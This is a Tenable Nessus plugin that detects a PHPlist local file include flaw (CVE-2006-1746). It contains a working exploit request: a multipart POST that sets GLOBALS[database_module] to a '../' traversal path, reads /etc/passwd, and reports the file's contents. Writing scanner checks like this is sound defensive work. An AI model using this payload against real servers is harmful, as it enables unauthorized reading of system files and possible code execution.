#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server contains a PHP script that is prone to a local
file include attack. 

Description :

The version of PHPlist installed on the remote host fails to sanitize
user-supplied input to the 'database_module' parameter of the
'lists/index.php' script before using it in a PHP 'require_once'
function.  Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this issue to view
arbitrary files or to execute arbitrary PHP code on the remote host,
subject to permissions of the web server user id. 

See also :

http://www.securityfocus.com/archive/1/430475/30/30/threaded
http://www.securityfocus.com/archive/1/430597
http://www.hardened-php.net/advisory_202005.79.html
http://tincan.co.uk/?lid=851

Solution :

Either edit the config file as described in the second reference above
or upgrade to PHP version 4.4.1 / 5.0.5 or later. 

Risk factor :

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:N/I:P/A:N/B:N)";


if (description)
{
  script_id(21222);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-1746");
  script_bugtraq_id(17429);

  script_name(english:"PHPlist database_module Parameter Local File Include Vulnerability");
  script_summary(english:"Tries to read /etc/passwd using PHPlist");

  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("phplist_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/phplist"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure one of the affected scripts exists.
  req = http_get(item:string(dir, "/lists/index.php"), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # If it does...
  if ("class=webblermenu>PHPlist" >< res)
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd";
    boundary = "bound";
    req = string(
      "POST ",  dir, "/lists/index.php HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS[developer_email]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "developer_email=", SCRIPT_NAME, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="GLOBALS[database_module]"', "\r\n",
      "Content-Type: text/plain\r\n",
      "\r\n",
      "../../../../../../../../../../", file, "\r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\([^)]+/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\([^)]+/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:")) 
        contents = res - strstr(res, "<br />");

      if (isnull(contents)) report = desc;
      else
        report = string(
          desc,
          "\n\n",
          "Plugin output :\n",
          "\n",
          "Here are the contents of the file '/etc/passwd' that\n",
          "Nessus was able to read from the remote host :\n",
          "\n",
          contents
        );

      security_note(port:port, data:report);
      exit(0);
    }
  }
}
